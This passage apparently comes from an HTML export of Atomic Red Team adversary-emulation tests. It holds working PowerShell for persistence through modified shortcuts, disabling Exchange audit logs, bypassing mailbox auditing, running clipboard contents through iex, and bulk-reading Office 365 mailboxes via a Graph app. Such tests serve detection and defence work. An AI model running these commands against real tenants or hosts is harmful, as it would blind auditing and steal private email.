<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\61 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ce4fc678-364f-4282-af16-2fb4c78005ce</li>
<li><strong>name</strong>: Shortcut Modification</li>
<li>
<p><strong>description</strong>: This test to simulate shortcut modification and then execute. example shortcut (<em>.lnk , .url) strings check with powershell;
gci -path "C:\Users" -recurse -include </em>.url -ea SilentlyContinue | Select-String -Pattern "exe" | FL.
Upon execution, calc.exe will be launched.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: echo [InternetShortcut] &gt; #{shortcut_file_path}
echo URL=C:\windows\system32\calc.exe &gt;&gt; #{shortcut_file_path}</li>
</ul>
<h1>{shortcut_file_path}</h1>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: del -f #{shortcut_file_path} &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.009</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: {'description': 'shortcut modified and execute', 'type': 'path', 'default': '%temp%\T1547.009_modified_shortcut.url'}</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1ee572f3-056c-4632-a7fc-7e7c42b1543c</li>
<li><strong>name</strong>: Office 365 - Exchange Audit Log Disabled</li>
<li>
<p><strong>description</strong>: You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.
Unified or Admin Audit logs are disabled via the Exchange Powershell cmdline.
https://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml</p>
</li>
<li>
<p><strong>platforms</strong>: ['office-365']</p>
</li>
<li>
<p><strong>command</strong>: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False</p>
</li>
<li>
<p><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name ExchangeOnlineManagement       <br />
Import-Module ExchangeOnlineManagement</p>
</li>
<li>
<p><strong>cleanup_command</strong>: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.008</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'office-365 username', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.password</strong>: {'description': 'office-365 password', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c9a2f6fe-7197-488c-af6d-10c782121ca6</li>
<li><strong>name</strong>: Office 365 - Set Audit Bypass For a Mailbox</li>
<li>
<p><strong>description</strong>: Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.
https://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps</p>
</li>
<li>
<p><strong>platforms</strong>: ['office-365']</p>
</li>
<li>
<p><strong>command</strong>: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-MailboxAuditBypassAssociation -Identity "#{target_email}" -AuditBypassEnabled $true</p>
</li>
<li>
<p><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name ExchangeOnlineManagement       <br />
Import-Module ExchangeOnlineManagement</p>
</li>
<li>
<p><strong>cleanup_command</strong>: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-MailboxAuditBypassAssociation -Identity "#{target_email}" -AuditBypassEnabled $false
Disconnect-ExchangeOnline -Confirm:$false</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.008</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'office-365 username', 'type': 'string', 'default': 'o365_user_test'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'office-365 password', 'type': 'string', 'default': 'o365_password_test'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: {'description': 'office-365 target_email', 'type': 'string', 'default': 'o365_email_test'}</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d6dc21af-bec9-4152-be86-326b6babd416</li>
<li><strong>name</strong>: Execute Commands from Clipboard using PowerShell</li>
<li>
<p><strong>description</strong>: Utilize PowerShell to echo a command to clipboard and execute it</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: echo Get-Process | clip
Get-Clipboard | iex</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1115</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 36657d95-d9d6-4fbf-8a31-f4085607bafd</li>
<li><strong>name</strong>: Office365 - Remote Mail Collected</li>
<li>
<p><strong>description</strong>: Create and register an entra application that downloads emails from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only access. This can be used by an adversary to collect an organization's sensitive information. </p>
</li>
<li>
<p><strong>platforms</strong>: ['office-365']</p>
</li>
<li>
<p><strong>command</strong>: $ss = ConvertTo-SecureString "#{password}" -AsPlainText -Force
$cred = New-Object PSCredential -ArgumentList '#{username}', $ss
$param = @{
    Credential = $cred
    Force      = $true
}
$null = Connect-AzAccount @param
$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token
$cert = New-SelfSignedCertificate -Subject "CN=PowerShell Application" -CertStoreLocation "Cert:\CurrentUser\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256
$reqResourceAccess = ( @{ "resourceAccess" = (@{"id"= "570282fd-fa5c-430d-a7fd-fc8dc98a9dca"; "type"= "Scope"}, @{ "id"= "7427e0e9-2fba-42fe-b0c0-848c9e6a8182"; "type"= "Scope"}, @{"id"= "37f7f235-527c-4136-accd-4a02d197296e"; "type"= "Scope"}, @{"id"= "14dad69e-099b-42c9-810b-d002981feec1"; "type"= "Scope"}, @{ "id"= "e1fe6dd8-ba31-4d61-89e7-88639da4683d"; "type"= "Scope"}, @{ "id"= "810c84a8-4a9e-49e6-bf7d-12d183f40d01"; "type"= "Role"}); "resourceAppId" = "00000003-0000-0000-c000-000000000000" })
connect-mggraph -AccessToken $token
$context = Get-MgContext     <br />
$users = get-MgUser
$app = New-MgApplication -DisplayName "T1114.002 Atomic Test #1 - Office365 - Remote Email Collection" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris="http://localhost"; } -KeyCredentials @(@{ Type="AsymmetricX509Cert"; Usage="Verify"; Key=$cert.RawData })
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
$resourceSPN = Get-MgServicePrincipal -Filter "AppId eq '$($app.AppId)'"
$graphApiApp = Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq "Mail.Read"
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id
$mailbox1 = "#{1st_target_mailbox}"
$mailbox2 = "#{2nd_target_mailbox}"
$mailbox3 = "#{3rd_target_mailbox}"
[System.Collections.ArrayList]$selectUsers = @()
foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name
foreach ($user in $selectUsers) { $url= "https://graph.microsoft.com/v1.0/users/$($user)/messages" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}</p>
</li>
<li>
<p><strong>prereq_command</strong>: $RequiredModule = Get-InstalledModule Microsoft.Graph
if (-not $RequiredModule) {exit 1} else {exit 0}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module Microsoft.Graph -Scope CurrentUser</p>
</li>
<li>
<p><strong>cleanup_command</strong>: connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome
Remove-MgApplication $app.AppId
Remove-Item -Path Cert:\CurrentUser\My\$($cert.thumbprint) -DeleteKey
Disconnect-MgGraph</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1114.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Full username (including @domain) of Entra user w/ AppRoleassignment.ReadWrite.All and Application.ReadWrite.All Scope (eg, Global Administrator Role) and sign-in method is password', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Entra user password', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: {'description': 'office-365 target_email_address', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: {'description': 'office-365 target_email_address', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: {'description': 'office-365 target_email_address', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: faab755e-4299-48ec-8202-fc7885eb6545</li>
<li><strong>name</strong>: List Google Chrome / Opera Bookmarks on Windows with powershell</li>
<li>
<p><strong>description</strong>: Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.
Upon execution, paths that contain bookmark files will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1217</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
